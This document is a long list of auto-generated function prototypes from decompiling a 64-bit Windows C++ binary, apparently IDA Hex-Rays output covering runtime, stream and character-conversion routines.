__int64 __fastcall sub_140040790(_BYTE *a1, int a2, int a3);
__int64 sub_140040CD0(void); // weak
__int64 __fastcall sub_140040CF0(__int64 a1);
__int64 __fastcall sub_140040D40(__int64 a1, __int64 a2);
__int64 __fastcall sub_140040D50(__int64 a1);
__int64 sub_140040DA0();
__int64 __fastcall sub_140040DC0(_QWORD *a1);
__int64 __fastcall sub_140040E80(const char *a1);
__int64 sub_1400411A0();
__int64 __fastcall sub_140041240(__int64 a1);
__int64 __fastcall sub_1400412D0(__int64 a1);
__int64 sub_140041420();
__int64 __fastcall sub_1400414A0(__int64 a1);
__int64 __fastcall sub_140041580(__int64 *a1);
void __fastcall sub_1400415E0(__int64 a1, __int64 a2, __int64 a3);
__int64 __fastcall sub_140041620(__int64 *a1, __int64 a2, __int64 a3, int *a4, int a5, int a6);
__int64 __fastcall sub_1400417E0(__int64 *a1, int a2);
void __fastcall sub_140041910(__int64 a1);
__int64 __fastcall sub_140041960(unsigned int *a1, __int64 a2);
void __fastcall sub_140041990(void *a1);
void *__fastcall sub_1400419B0(size_t a1);
void *__fastcall sub_1400419D0(size_t a1);
__int64 __fastcall sub_140041A10(__int64 a1, __int64 a2, __int64 a3);
__int64 __fastcall sub_140041AC0(__int64 a1, __int64 a2, __int64 a3);
__int64 __fastcall sub_140041BA0(__int64 a1, __int64 a2, __int64 a3);
__int64 __fastcall sub_140041C70(__int64 a1, __int64 a2, __int64 a3);
__int64 __fastcall sub_140041D70(_QWORD *a1, __int64 a2, __int64 a3, __int64 a4, int *a5);
__int64 __fastcall sub_140042360(__int64 a1);
__int64 __fastcall sub_1400423F0(_BYTE *a1, __int64 a2);
__int64 __fastcall sub_140042980(__int64 a1);
__int64 __fastcall sub_140042A10(__int64 a1, char *a2, size_t a3);
void __fastcall sub_140042B20(__int64 *a1, __int64 a2, __int64 a3);
__int64 *sub_140044720();
__int64 *__fastcall sub_1400447B0(__int64 *a1);
__int64 __fastcall sub_140044850(__int64 *a1, _QWORD *a2, _BYTE *a3, __int64 a4, int *a5);
__int64 __fastcall sub_140044B00(__int64 a1, _QWORD *a2, int a3, _BYTE *a4, unsigned __int64 a5, int *a6);
int *__fastcall sub_140044DF0(__int64 *a1, _QWORD *a2, __int64 a3, int a4, int *a5);
__int64 __fastcall sub_1400451D0(__int64 a1, _QWORD *a2, _BYTE *a3, __int64 a4, int *a5);
__int64 __fastcall sub_1400454C0(__int64 a1, _QWORD *a2, int a3, _BYTE *a4, unsigned __int64 a5, int *a6);
int *__fastcall sub_1400457E0(__int64 a1, _QWORD *a2, __int64 a3, int a4, int *a5);
__int64 __fastcall sub_140045A70(_QWORD *a1, size_t *a2, __int64 a3, std::ios_base *a4);
__int64 __fastcall sub_140045D90(__int64 a1, __int64 a2, __int64 a3, __int64 a4);
__int64 __fastcall sub_140045DE0(std::ios_base *a1, int *a2, __int64 **a3, __int64 **a4, char *a5, int a6);
__int64 sub_1400462F0(__int64 a1, __int64 a2, unsigned int a3, ...);
__int64 __fastcall sub_140046380(std::ios_base *a1, int *a2, __int64 **a3, __int64 **a4);
__int64 **__fastcall sub_1400463B0(char *a1, int a2, __int64 *a3, __int64 a4, std::ios_base *a5);
__int64 __fastcall sub_140046790(__int64 a1, __int64 a2, unsigned int a3, char *a4, unsigned int a5, __int64 a6);
__int64 __fastcall sub_140046880(_BYTE *a1, int a2, __int64 *a3, std::ios_base *a4);
__int64 sub_140046D20(void); // weak
__int64 __fastcall sub_140046D40(__int64 a1);
__int64 __fastcall sub_140046D90(__int64 a1, __int64 a2);
__int64 __fastcall sub_140046DA0(__int64 a1);
__int64 sub_140046DF0();
int sub_140046E10();
__int64 __fastcall sub_140046E40(__int64 a1, __int64 *a2, int a3);
__int64 __fastcall sub_140046FD0(__int64 a1, __int64 a2);
__int64 __fastcall sub_140047090(__int64 a1, __int64 a2, int a3);
__int64 __fastcall sub_140047230(__int64 a1, __int64 a2);
void __fastcall sub_140047350(int *a1);
int __fastcall sub_140047390(const void **a1, __int64 a2);
__int64 __fastcall sub_1400473E0(__int64 a1, __int64 a2);
__int64 __fastcall sub_140047450(__int64 a1);
void __fastcall sub_140047500(__int64 a1);
_DWORD *__fastcall sub_140047570();
__int64 __fastcall sub_1400475D0(__int64 a1, _BYTE *a2, int a3);
void __fastcall sub_1400476D0(__int64 a1, __int64 a2, int a3);
_DWORD *__fastcall sub_140047720(int a1);
__int64 __fastcall sub_140047780(_BYTE **a1, int *a2, int *a3, int *a4, int a5);
__int64 __fastcall sub_140047960(int a1, int a2, int a3);
__int64 __fastcall sub_1400479B0(_WORD **a1);
char __fastcall sub_1400479D0(_BYTE **a1, int a2, int a3, int a4, char a5);
void __fastcall sub_140047B00(__int64 a1, int a2);
int __fastcall sub_140047B60(__int64 a1, __int64 a2);
__int64 __fastcall sub_140047B90(__int64 a1);
void __fastcall sub_140047CD0(std::ios_base *a1);
__int64 __fastcall sub_140047CF0(__int64 a1, __int64 a2);
__int64 __fastcall sub_140047D60(charNode *a1);
// __int64 __fastcall charNode::raw_length(charNode *__hidden this); idb
_BOOL8 __fastcall sub_140047D80(__int64 a1, __int64 a2);
__int64 __fastcall sub_140047DE0(__int64 a1, __int64 a2, int a3);
__int64 __fastcall sub_140047E00(__int64 a1, __int64 a2, int a3);
__int64 __fastcall sub_140047E20(__int64 a1, __int64 a2, int a3);
__int64 __fastcall sub_140047E40(__int64 a1, int a2, int a3, _DWORD *a4);
void __fastcall sub_140047E90(__int64 a1);
__int64 __fastcall sub_140047EB0(__int64 a1, __int64 a2);
__int64 __fastcall sub_140048020(__int64 a1, __int64 a2);
__int64 __fastcall sub_140048160(__int64 a1, __int64 a2);
__int64 __fastcall sub_1400482D0(__int64 a1, __int64 a2);
__int64 __fastcall sub_140048430(__int64 a1, char **a2, __int64 a3);
__int64 __fastcall sub_1400484B0(__int64 a1, unsigned __int8 **a2);
__int64 __fastcall sub_1400484F0(__int64 a1);
__int64 __fastcall sub_140048510(__int64 a1);
__int64 __fastcall sub_140048530(__int64 a1);
_BOOL8 __fastcall sub_140048550(__int64 a1, __int64 a2);
__int64 __fastcall sub_1400485E0(__int64 a1);
__int64 __fastcall sub_140048640(__int64 a1);
__int64 __fastcall sub_140048730(__int64 a1);
_BOOL8 __fastcall sub_140048B30(__int64 a1, _QWORD *a2, unsigned int *a3);
__int64 __fastcall sub_140048CF0(__int64 *a1, __int64 a2);
__int64 __fastcall sub_140048FA0(__int64 a1, __int64 a2, int a3, int a4);
__int64 __fastcall sub_1400492D0(_DWORD **a1, __int64 a2);
__int64 __fastcall sub_140049330(__int64 a1, __int64 a2, int a3);
__int64 __fastcall sub_140049460(__int64 a1, char **a2, __int64 a3);
__int64 __fastcall sub_1400494D0(__int64 a1, unsigned __int8 **a2);
__int64 __fastcall sub_1400494F0(__int64 a1, __int64 a2, int a3);
__int64 __fastcall sub_140049510(__int64 a1, __int64 a2, int a3);
__int64 __fastcall sub_140049530(__int64 a1, __int64 a2, int a3);
__int64 __fastcall sub_140049550(__int64 a1, char **a2, __int64 a3);
__int64 __fastcall sub_1400495C0(__int64 a1, unsigned __int8 **a2);
__int64 __fastcall sub_1400495E0(__int64 a1, __int64 a2, unsigned int *a3, int a4);
__int64 __fastcall sub_1400496F0(unsigned int *a1, int a2, int a3, _QWORD *a4);
__int64 __fastcall sub_140049880(__int64 a1, __int64 a2);
__int64 __fastcall sub_140049A00(__int64 a1, __int64 a2);
__int64 __fastcall sub_140049B60(__int64 a1, __int64 a2);
__int64 __fastcall sub_140049D30(__int64 a1, __int64 a2);
__int64 __fastcall sub_140049EA0(__int64 a1);
__int64 __fastcall sub_140049EC0(__int64 a1);
__int64 __fastcall sub_140049EE0(__int64 a1);
__int64 __fastcall sub_140049F00(charNode *a1);
// __int64 __fastcall charNode::raw_length(charNode *__hidden this); idb
__int64 __fastcall sub_140049F30(__int64 a1, __int64 a2);
_BOOL8 __fastcall sub_14004A020(__int64 a1, __int64 a2);
_BOOL8 __fastcall sub_14004A0B0(__int64 a1, __int64 a2);
void __fastcall sub_14004A0F0(__int64 a1);
__int64 __fastcall sub_14004A110(__int64 a1, __int64 *a2, int a3, int a4);
__int64 __fastcall sub_14004A290(__int64 a1, __int64 a2);
__int64 __fastcall sub_14004A3B0(__int64 a1, __int64 a2);
__int64 __fastcall sub_14004A4B0(__int64 a1, __int64 a2);
__int64 __fastcall sub_14004A560(__int64 a1, __int64 a2);
__int64 __fastcall sub_14004A650(__int64 a1, __int64 a2);
__int64 __fastcall sub_14004A8D0(__int64 a1);
__int64 __fastcall sub_14004A8F0(__int64 a1);
__int64 __fastcall sub_14004A920(__int64 a1);
_BOOL8 __fastcall sub_14004A9A0(__int64 a1);
__int64 __fastcall sub_14004A9E0(__int64 a1, __int64 a2);
__int64 __fastcall sub_14004AA60(__int64 a1, __int64 a2);
void __fastcall sub_14004AAD0(__int64 a1);
__int64 __fastcall sub_14004AAF0(__int64 a1, char **a2, unsigned int a3);
__int64 __fastcall sub_14004AB60(__int64 a1, unsigned __int8 **a2);
__int64 __fastcall sub_14004AB80(__int64 a1, __int64 a2, unsigned int a3);
__int64 __fastcall sub_14004ABA0(__int64 a1, __int64 a2, unsigned int a3);
__int64 __fastcall sub_14004ABC0(__int64 a1, __int64 a2, unsigned int a3);
__int64 __fastcall sub_14004ABE0(__int64 a1, char **a2, __int64 a3);
__int64 __fastcall sub_14004AC50(__int64 a1, unsigned __int8 **a2);
__int64 __fastcall sub_14004AC70(unsigned int *a1, int a2, int a3, _QWORD *a4);
__int64 __fastcall sub_14004AEE0(__int64 a1, std::ios_base *a2, unsigned int a3, int a4);
__int64 __fastcall sub_14004B130(__int64 a1);
__int64 __fastcall sub_14004B220(__int64 a1);
__int64 __fastcall sub_14004B630(__int64 *a1, int a2);
__int64 __fastcall sub_14004B740(__int64 a1, _QWORD *a2, unsigned int *a3);
__int64 __fastcall sub_14004B890(__int64 *a1, __int64 a2);
__int64 __fastcall sub_14004BA90(_DWORD *a1, char ***a2, __int64 a3);
__int64 **__fastcall sub_14004BB90(int a1, __int64 a2);
__int64 sub_14004BC80();
void __fastcall sub_14004BC90(std::ios_base *a1);
__int64 __fastcall sub_14004BCD0(__int64 a1, int a2, __int64 a3, _DWORD *a4);
int __fastcall sub_14004BCF0(std::ios_base *a1, std::ios_base *a2);
__int64 __fastcall sub_14004BD30(__int64 a1, _BYTE **a2, int a3);
__int64 __fastcall sub_14004BDC0(std::ios_base *a1, void **a2);
__int64 __fastcall sub_14004BE60(__int64 a1, __int64 a2);
__int64 __fastcall sub_14004BF00(__int64 a1, __int64 a2);
_BOOL8 __fastcall sub_14004BF90(__int64 a1, __int64 a2);
__int64 __fastcall sub_14004C000(__int64 a1, char **a2, __int64 a3);
__int64 __fastcall sub_14004C070(__int64 a1, unsigned __int8 **a2);
__int64 __fastcall sub_14004C090(__int64 a1, __int64 a2);
__int64 __fastcall sub_14004C150(__int64 a1, __int64 a2);
__int64 __fastcall sub_14004C1E0(__int64 a1);
__int64 __fastcall sub_14004C200(__int64 a1);
__int64 __fastcall sub_14004C220(__int64 a1);
void __fastcall sub_14004C240(__int64 a1);
__int64 __fastcall sub_14004C260(__int64 a1, __int64 a2, int a3);
__int64 __fastcall sub_14004C330(__int64 a1, __int64 a2, int a3);
__int64 __fastcall sub_14004C350(__int64 a1, __int64 *a2, int *a3, int a4);
__int64 __fastcall sub_14004C470(__int64 a1, int a2, int a3, _QWORD *a4);
__int64 __fastcall sub_14004C5A0(__int64 a1, __int64 a2, __int64 a3, __int64 *a4, int a5, __int64 a6);
__int64 __fastcall sub_14004C630(std::ios_base *a1, __int64 a2, __int64 a3, __int64 *a4, __int64 *a5);
__int64 __fastcall sub_14004C740(__int64 a1, __int64 *a2, int a3, int a4);
void *__fastcall sub_14004C920(__int64 *a1);
__int64 __fastcall sub_14004C990(__int64 a1);
__int64 __fastcall sub_14004CC60(__int64 a1);
__int64 __fastcall sub_14004CED0(_QWORD *a1);
__int64 __fastcall sub_14004CFB0(_QWORD *a1);
_DWORD *__fastcall sub_14004D060(__int64 *a1);
__int64 __fastcall sub_14004D210(__int64 *a1, unsigned int *a2);
__int64 __fastcall sub_14004D270(__int64 **a1, unsigned int *a2);
void *__fastcall sub_14004D360(__int64 *a1, __int64 *a2);
__int64 __fastcall sub_14004D400(__int64 a1, __int64 a2, __int64 *a3, int a4);
__int64 __fastcall sub_14004D650(__int64 a1, __int64 *a2, __int64 *a3, __int64 a4);
__int64 __fastcall sub_14004D940(__int64 a1, unsigned int a2);
__int64 __fastcall sub_14004D9A0(int a1);
__int64 __fastcall sub_14004D9C0(_QWORD *a1, __int64 a2, int a3);
__int64 __fastcall sub_14004DA90(__int64 a1);
void __fastcall sub_14004DB00(__int64 a1);
__int64 sub_14004DB80();
void __fastcall sub_14004DBA0(unsigned int a1, unsigned int *a2, __int64 a3, __int64 a4);
__int64 __fastcall sub_14004DC70(__int64 a1, __int64 a2, __int64 a3, int *a4);
__int64 *__fastcall sub_14004DD40(__int64 *a1, __int64 a2, __int64 a3, int *a4, __int64 a5, __int64 a6);
void __fastcall sub_14004DEF0(_DWORD **a1);
__int64 __fastcall sub_14004DF50(__int64 a1, __int64 a2, __int64 a3, int *a4);
_BOOL8 __fastcall sub_14004DFD0(__int64 a1);
__int64 __fastcall sub_14004E000(__int64 a1);
_QWORD *__fastcall sub_14004E020(__int64 a1, __int64 a2, __int64 a3);
__int64 __fastcall sub_14004E160(__int64 a1);
__int64 __fastcall sub_14004E180(__int64 a1);
__int64 __fastcall sub_14004E1A0(__int64 a1, int *a2);
__int64 __fastcall sub_14004E2A0(unsigned int a1, const void *a2, _BYTE *a3, __int64 a4, int a5);
__int64 __fastcall sub_14004E5C0(unsigned int a1, const void *a2, _BYTE *a3, __int64 a4, int a5);
__int64 __fastcall sub_14004E980(int a1, _BYTE *a2, void *a3, __int64 a4, int a5);
__int64 __fastcall sub_14004ECB0(int a1, _BYTE *a2, void *a3, __int64 a4, int a5);
__int64 __fastcall sub_14004F080(__int64 a1, __int64 a2, __int64 a3, int *a4);
__int64 __fastcall sub_14004F4F0(__int64 a1);
__int64 __fastcall sub_14004F500(__int64 *a1);
char **sub_14004F540();
__int64 __fastcall sub_14004F550(__int64 a1, __int64 a2, __int64 a3, int *a4);
__int64 __fastcall sub_14004F5D0(__int64 a1, _DWORD *a2, int *a3);
__int64 sub_14004F690(void); // weak
__int64 __fastcall sub_14004F6B0(__int64 a1);
__int64 __fastcall sub_14004F700(__int64 a1);
__int64 sub_14004F750();
__int64 __fastcall sub_14004F770(__int64 a1);
__int64 __fastcall sub_14004F960(_BYTE *a1, __int64 a2, __int64 a3);
__int64 __fastcall sub_14004FB10(__int64 a1, __int64 a2, __int64 a3, __int64 a4, unsigned __int64 a5, int *a6, __int64 a7);
__int64 __fastcall sub_14004FB60(__int64 a1);
__int64 __fastcall sub_14004FB70(__int64 a1);
char **sub_14004FB90();
__int64 __fastcall sub_14004FBA0(__int64 a1, __int64 a2, __int64 a3);
__int64 __fastcall sub_14004FBC0(char *a1, __int64 a2, __int64 a3);
__int64 __fastcall sub_14004FC60(__int64 a1);
__int64 sub_14004FC80(void); // weak
__int64 __fastcall sub_14004FCA0(__int64 a1);
__int64 __fastcall sub_14004FCF0(__int64 a1);
__int64 sub_14004FD40();
void *sub_14004FD60();
void __fastcall sub_14004FD70(__int64 a1);
void *sub_14004FD90();
_DWORD *__fastcall sub_14004FDA0();
void *sub_14004FDC0();
void *sub_14004FDD0();
void *sub_14004FDE0();
void *sub_14004FDF0();
_DWORD *__fastcall sub_14004FE00();
void *sub_14004FE20();
_DWORD *__fastcall sub_14004FE30();
void *sub_14004FE50();
_DWORD *__fastcall sub_14004FE60();
void *sub_14004FE80();
__int64 sub_14004FE90();
void *sub_14004FEB0();
void *sub_14004FEC0();
void *sub_14004FED0();
_DWORD *__fastcall sub_14004FEE0();
void *sub_14004FF00();
void *sub_14004FF10();
void __fastcall sub_14004FF20(unsigned int *a1);
__int64 sub_14004FF40();
_DWORD *__fastcall sub_14004FF60();
void *sub_14004FF80();
_DWORD *__fastcall sub_14004FF90();
void *sub_14004FFB0();
void *sub_14004FFC0();
__int64 __fastcall sub_14004FFD0(__int64 *a1, char **a2, __int64 a3);
__int64 __fastcall sub_14004FFF0(__int64 *a1, char **a2, __int64 a3);
__int64 __fastcall sub_140050010(__int64 *a1, char **a2, __int64 a3);
__int64 __fastcall sub_140050030(__int64 *a1, char **a2, __int64 a3);
__int64 __fastcall sub_140050050(unsigned int *a1, unsigned __int8 **a2);
__int64 __fastcall sub_140050070(unsigned int *a1, unsigned __int8 **a2);
__int64 __fastcall sub_140050090(unsigned int *a1, unsigned __int8 **a2);
__int64 __fastcall sub_1400500B0(unsigned int *a1, unsigned __int8 **a2);
__int64 __fastcall sub_1400500D0(unsigned int *a1, unsigned __int8 **a2);
__int64 *__fastcall sub_1400500F0(char *a1, int a2, _QWORD *a3);
__int64 __fastcall sub_140050350(__int64 a1, int *a2, __int64 **a3, __int64 *a4);
__int64 __fastcall sub_140050380(_BYTE *a1, int a2, __int64 *a3, __int64 a4);
char **sub_140050730();
__int64 __fastcall sub_140050740(__int64 a1, int *a2, __int64 **a3, __int64 *a4, char *a5, int a6);
__int64 sub_1400509C0(void); // weak
__int64 __fastcall sub_1400509E0(__int64 a1);
__int64 __fastcall sub_140050A30(__int64 a1);
__int64 sub_140050A80();
__int64 __fastcall sub_140050AA0(__int64 a1, unsigned int *a2);
__int64 __fastcall sub_140050B50(__int64 *a1, __int64 a2);
__int64 __fastcall sub_140050B70(__int64 a1);
void __fastcall sub_140050BB0(_DWORD *a1, char *a2);
__int64 __fastcall sub_140050C80(__int64 *a1, __int64 a2, int a3);
void __fastcall sub_140050F30(_DWORD *a1, __int64 a2);
__int64 __fastcall sub_140050F80(_DWORD **a1, __int64 a2, int a3);
__int64 __fastcall sub_140051110(__int64 *a1, int *a2);
void __fastcall sub_140051230(unsigned int **a1, __int64 a2);
void __fastcall sub_140051250(unsigned int *a1, __int64 a2);
void __fastcall sub_140051280(unsigned int **a1, __int64 a2, int a3);
void __fastcall sub_1400514E0(__int64 *a1, __int64 a2, int a3);
void __fastcall sub_140051600(unsigned int **a1, int *a2);
__int64 __fastcall sub_1400516D0(__int64 *a1, char **a2, __int64 a3, __int64 a4);
__int64 __fastcall sub_140051760(__int64 *a1, char **a2, __int64 a3, __int64 a4, unsigned int a5, int a6, char a7, __int64 a8);
__int64 __fastcall sub_1400517D0(unsigned int a1);
__int64 __fastcall sub_1400517F0(int *a1, int *a2, _BYTE *a3, _BYTE *a4, _BYTE *a5, _BYTE **a6, int a7, int a8, int a9, char a10, __int64 a11);
__int64 __fastcall sub_140051A20(__int64 a1, void **a2, int a3, char a4, int a5, int a6, int a7);
__int64 __fastcall sub_140051D00(__int64 *a1, char **a2, int a3, __int64 a4, unsigned int a5, int a6, char a7, __int64 a8);
__int64 __fastcall sub_140052150(__int64 *a1, char *a2, int a3, int a4, _BYTE *a5, __int64 a6);
__int64 __fastcall sub_140052490(_BYTE **a1, int a2, char a3);
__int64 __fastcall sub_1400525F0(__int64 *a1, char **a2, __int64 a3, __int64 a4, unsigned int a5, int a6, char a7, __int64 a8);
__int64 __fastcall sub_140052DF0(unsigned int **a1, _BYTE **a2, int a3, __int64 a4, char a5, __int64 a6);
__int64 __fastcall sub_140052FC0(unsigned int **a1, _BYTE **a2, int a3, unsigned int *a4, char a5, __int64 a6);
__int64 __fastcall sub_140053350(unsigned int **a1, unsigned __int8 **a2, __int64 a3, int a4, int a5);
__int64 __fastcall sub_1400536F0(unsigned int *a1, unsigned __int8 **a2, __int64 a3);
__int64 __fastcall sub_140053710(unsigned __int8 ***a1, unsigned __int8 *a2, int *a3, __int64 a4);
__int64 __fastcall sub_1400538D0(unsigned __int8 ***a1, unsigned __int8 **a2, __int64 a3, int a4, char a5);
__int64 __fastcall sub_1400539D0(unsigned int *a1, unsigned __int8 **a2, __int64 a3, int a4);
__int64 __fastcall sub_140053AB0(unsigned int *a1, void **a2, int a3, int a4, int a5, int a6);
__int64 __fastcall sub_140053D50(unsigned int **a1, _BYTE **a2, int *a3, int a4, int a5);
int __fastcall sub_140054070(_DWORD *a1, _DWORD *a2);
__int64 __fastcall sub_1400540C0(__int64 a1, unsigned __int16 *a2);
__int64 __fastcall sub_140054110(__int64 a1, int a2, __int64 a3, unsigned __int8 *a4);
__int64 __fastcall sub_140054160(__int64 a1, __int64 a2, unsigned __int8 *a3, unsigned __int64 a4);
__int64 __fastcall sub_140054210(__int64 a1, __int64 a2, _BYTE *a3, unsigned __int64 a4);
__int64 __fastcall sub_140054330(__int64 a1, __int64 a2, unsigned __int16 *a3, unsigned __int64 a4);
__int64 __fastcall sub_140054460(__int64 a1, _BYTE *a2, char *a3, unsigned __int64 a4);
__int64 __fastcall sub_1400545B0(__int64 a1, __int64 a2, __int64 a3, unsigned __int64 a4);
__int64 __fastcall sub_140054750(__int64 a1, __int64 a2, __int64 a3, unsigned __int64 a4);
void *sub_140054860();
void *sub_140054870();
void *sub_140054880();
void *sub_140054890();
void *sub_1400548A0();
void *sub_1400548B0();
__int64 __fastcall sub_1400548C0(__int64 a1, unsigned __int8 *a2, void *a3, size_t a4);
__int64 __fastcall sub_140054970(__int64 a1, unsigned __int16 *a2);
__int64 __fastcall sub_140054A20(__int64 a1, unsigned __int16 *a2);
__int64 __fastcall sub_140054A90(__int64 a1, int a2, __int64 a3, unsigned __int8 *a4);
__int64 __fastcall sub_140054B20(__int64 a1, __int64 a2, unsigned __int8 *a3, unsigned __int64 a4);
__int64 __fastcall sub_140054C00(__int64 a1, __int64 a2, _BYTE *a3, unsigned __int64 a4);
__int64 __fastcall sub_140054D90(__int64 a1, __int64 a2, unsigned __int16 *a3, unsigned __int64 a4);
__int64 __fastcall sub_140054F10(__int64 a1, _BYTE *a2, char *a3, unsigned __int64 a4);
__int64 __fastcall sub_1400550E0(__int64 a1, __int64 a2, __int64 a3, unsigned __int64 a4);
__int64 __fastcall sub_140055250(__int64 a1, __int64 a2, __int64 a3, unsigned __int64 a4);
void *sub_1400553D0();
void *sub_1400553E0();
void *sub_1400553F0();
void *sub_140055400();
void *sub_140055410();
void *sub_140055420();
void *sub_140055430();
void *sub_140055440();
void *sub_140055450();
void *sub_140055460();
void *sub_140055470();
unsigned __int64 __fastcall sub_140055480(__int64 a1, __int64 a2, unsigned __int16 *a3, unsigned __int64 a4);
__int64 __fastcall sub_1400556D0(__int64 a1, unsigned __int8 *a2, void *a3, size_t a4);
__int64 __fastcall sub_1400557E0(__int64 a1, __int64 a2);
__int64 __fastcall sub_140055840(__int64 a1, __int64 a2, unsigned __int16 *a3, unsigned __int64 a4);
const char *sub_1400559B0();
__int64 __fastcall sub_1400559C0(__int64 a1, __int64 a2);
__int64 __fastcall sub_140055A10(__int64 a1, _BYTE *a2, _BYTE *a3, unsigned __int64 a4);
void *sub_140055A60();
void *sub_140055A70();
__int64 __fastcall sub_140055A80(__int64 a1, __int64 a2);
__int64 __fastcall sub_140055B80(__int64 a1, unsigned __int8 *a2, unsigned __int8 *a3, unsigned __int64 a4);
__int64 __fastcall sub_140055DD0(__int64 a1, int a2, int a3, unsigned __int8 *a4);
void *sub_140056030();
__int64 __fastcall sub_140056040(__int64 a1, unsigned __int8 *a2, __int64 a3, int a4);
__int64 __fastcall sub_140056110(__int64 a1, __int64 a2, __int64 a3, unsigned __int64 a4);
__int64 __fastcall sub_1400561A0(__int64 a1, _BYTE *a2, __int64 a3, unsigned __int64 a4);
__int64 __fastcall sub_1400562A0(__int64 a1, __int64 a2, _BYTE *a3, unsigned __int64 a4);
__int64 __fastcall sub_1400563C0(__int64 a1, unsigned __int8 *a2, unsigned __int8 *a3, unsigned __int64 a4);
void *sub_1400564B0();
void *sub_1400564C0();
void *sub_1400564D0();
void *sub_1400564E0();
__int64 __fastcall sub_1400564F0(__int64 a1, __int64 a2);
_BOOL8 __fastcall sub_140056560(__FrameHandler3::TryBlockMap *a1, __int64 a2);
__int64 __fastcall sub_140056610(__FrameHandler3::TryBlockMap *a1, __int64 a2);
__int64 __fastcall sub_140056750(__int64 a1, int a2, int a3, _DWORD *a4);
__int64 __fastcall sub_1400567E0(__int64 a1, __int64 a2, unsigned __int16 *a3, unsigned __int64 a4);
__int64 __fastcall sub_1400568E0(__int64 a1, _BYTE *a2, char *a3, unsigned __int64 a4);
__int64 __fastcall sub_1400569D0(__int64 a1, __int64 a2, unsigned __int8 *a3, unsigned __int64 a4);
__int64 __fastcall sub_140056A80(__int64 a1, __int64 a2, _BYTE *a3, unsigned __int64 a4);
void *sub_140056BA0();
void *sub_140056BB0();
void *sub_140056BC0();
void *sub_140056BD0();
void *sub_140056BE0();
void *sub_140056BF0();
__int64 __fastcall sub_140056C00(__int64 a1, unsigned __int8 *a2);
__int64 __fastcall sub_140056C50(__int64 a1, _BYTE *a2, __int64 a3, unsigned __int64 a4);
__int64 __fastcall sub_140056D50(__int64 a1, unsigned __int8 *a2, unsigned __int8 *a3, unsigned __int64 a4);
__int64 __fastcall sub_140056E40(__int64 a1, __int64 a2, __int64 a3, unsigned __int64 a4);
__int64 __fastcall sub_140056EF0(__int64 a1, __int64 a2, _BYTE *a3, unsigned __int64 a4);
const char *sub_140057010();
void *sub_140057020();
void *sub_140057030();
void *sub_140057040();
__int64 __fastcall sub_140057050(__int64 a1, __int64 a2);
__int64 __fastcall sub_1400570A0(__int64 a1, _BYTE *a2, __int64 a3, unsigned __int64 a4);
__int64 __fastcall sub_1400571A0(__int64 a1, unsigned __int8 *a2, unsigned __int8 *a3, unsigned __int64 a4);
__int64 __fastcall sub_140057290(__int64 a1, __int64 a2, __int64 a3, unsigned __int64 a4);
__int64 __fastcall sub_140057340(__int64 a1, __int64 a2, _BYTE *a3, unsigned __int64 a4);
void *sub_140057460();
void *sub_140057470();
void *sub_140057480();
void *sub_140057490();
__int64 __fastcall sub_1400574A0(__int64 a1, _BYTE *a2, _BYTE *a3, unsigned __int64 a4);
__int64 __fastcall sub_140057550(__int64 a1, _BYTE *a2, _BYTE *a3, unsigned __int64 a4);
__int64 __fastcall sub_140057600(__int64 a1, __int64 a2, char *a3, __int64 a4);
__int64 __fastcall sub_1400576B0(__int64 a1, __int64 a2, __int64 a3, unsigned __int64 a4);
__int64 __fastcall sub_140057840(__int64 a1, _BYTE *a2, _BYTE *a3, unsigned __int64 a4);
__int64 __fastcall sub_140057930(__int64 a1);
__int64 __fastcall sub_1400579B0(__FrameHandler3::TryBlockMap *a1, int a2, int a3, _QWORD *a4);
__int64 __fastcall sub_140057EA0(__int64 a1, _DWORD *a2, const __m128i *a3);
__int64 __fastcall sub_140057FC0(__int64 a1, _BYTE *a2, char *a3, unsigned __int64 a4);
__int64 __fastcall sub_140058160(__int64 a1, int a2, __int64 a3, __int64 a4);
__int64 __fastcall sub_140058230(__int64 a1, _DWORD *a2, _OWORD *a3, int a4);
_BOOL8 __fastcall sub_140058350(__int64 a1, __int64 a2, _QWORD *a3, unsigned __int64 a4);
__int64 __fastcall sub_140058440(__int64 a1, int a2, int a3, _DWORD *a4);
__int64 __fastcall sub_140058700(__int64 a1, _DWORD *a2, const void *a3);
__int64 __fastcall sub_1400587F0(__int64 a1, __int64 *a2, _QWORD *a3, unsigned __int64 a4);
__int64 __fastcall sub_140058A40(__FrameHandler3::TryBlockMap *a1, _DWORD *a2, const void *a3);
__int64 __fastcall sub_140058B20(__FrameHandler3::TryBlockMap *a1, __int64 *a2, void *a3, unsigned __int64 a4);
__int64 __fastcall sub_140058CB0(__FrameHandler3::TryBlockMap *a1, int a2, int a3, void *a4);
__int64 __fastcall sub_140058E10(__int64 a1, _DWORD *a2, const void *a3);
__int64 __fastcall sub_140058F80(__int64 a1, __int64 a2, char *a3, size_t a4);
__int64 __fastcall sub_140059290(__int64 a1);
__int64 __fastcall sub_1400592C0(__int64 a1, _DWORD *a2, __int64 a3, int a4);
__int64 __fastcall sub_1400593C0(__int64 a1, char *a2, char *a3, unsigned __int64 a4);
__int64 __fastcall sub_1400594B0(__int64 a1, __int64 a2, __int64 a3, unsigned __int64 a4);
void *sub_140059540();
void *sub_140059550();
void *sub_140059560();
void *sub_140059570();
void *sub_140059580();
void *sub_140059590();
void *sub_1400595A0();
void *sub_1400595B0();
void *sub_1400595C0();
void *sub_1400595D0();
void *sub_1400595E0();
void *sub_1400595F0();
void *sub_140059600();
void *sub_140059610();
void *sub_140059620();
void *sub_140059630();
void *sub_140059640();
void *sub_140059650();
void *sub_140059660();
void *sub_140059670();
void *sub_140059680();
void *sub_140059690();
void *sub_1400596A0();
void *sub_1400596B0();
void *sub_1400596C0();
void *sub_1400596D0();
void *sub_1400596E0();
void *sub_1400596F0();
void *sub_140059700();
void *sub_140059710();
void *sub_140059720();
void *sub_140059730();
void *sub_140059740();
void *sub_140059750();
void *sub_140059760();
void *sub_140059770();
void *sub_140059780();
void *sub_140059790();
__int64 __fastcall sub_1400597A0(__int64 a1, _QWORD *a2, _QWORD *a3, unsigned __int64 a4);
__int64 __fastcall sub_140059990(__int64 a1, __int64 a2, __int64 a3, unsigned __int64 a4);
__int64 __fastcall sub_140059B50(__int64 a1, unsigned __int8 *a2, __int64 a3, int a4);
__int64 __fastcall sub_140059C30(__int64 a1, char *a2, char *a3, unsigned __int64 a4);
__int64 __fastcall sub_140059D20(__int64 a1, __int64 a2, __int64 a3, unsigned __int64 a4);
__int64 __fastcall sub_140059DB0(__int64 a1, _BYTE *a2, _BYTE *a3, unsigned __int64 a4);
__int64 __fastcall sub_140059E60(__int64 a1, _BYTE *a2, _BYTE *a3, unsigned __int64 a4);
